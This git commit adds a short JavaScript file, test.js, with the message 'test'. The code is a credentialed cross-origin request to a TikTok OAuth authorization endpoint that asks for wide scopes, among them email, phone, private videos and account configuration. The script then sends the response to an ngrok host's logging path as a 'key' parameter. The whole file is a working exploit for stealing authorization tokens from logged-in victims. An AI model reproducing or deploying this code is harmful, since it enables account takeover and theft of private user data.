8909c91ebcbc448c2fa04a32a49c8edbe81436ef
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-07-30 23:45:57 +0700

    Create test.js
    test

---
+++ test.js
@@ -0,0 +1,10 @@
+var xhr = new XMLHttpRequest();
+xhr.onload = reqListener; 
+xhr.open("POST", "https://www.tiktok.com/passport/open/web/auth/?client_key=aw8cb3204x0a1g88&scope=user.info.basic%2Cuser.info.phone%2Cvideo.list.manage%2Ccomment.list%2Clive.list%2Cvideo.list.private_ads.no_watermark%2Cuser.account.configure%2Cuser.info.showcase%2Cuser.info.email%2Cvideo.list.no_watermark%2Ccomment.list.manage&aid=1459&source=web&redirect_uri=https%3a%2f%2fads.tiktok.com%2fblablablabla&state=64588d019065e001fa8e7abdd884581c10770400");
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "text/javascript");
+xhr.send();
+
+function reqListener() {
+    location='//e5cc-202-162-37-174.ngrok-free.app/log?key='+this.responseText; 
+};
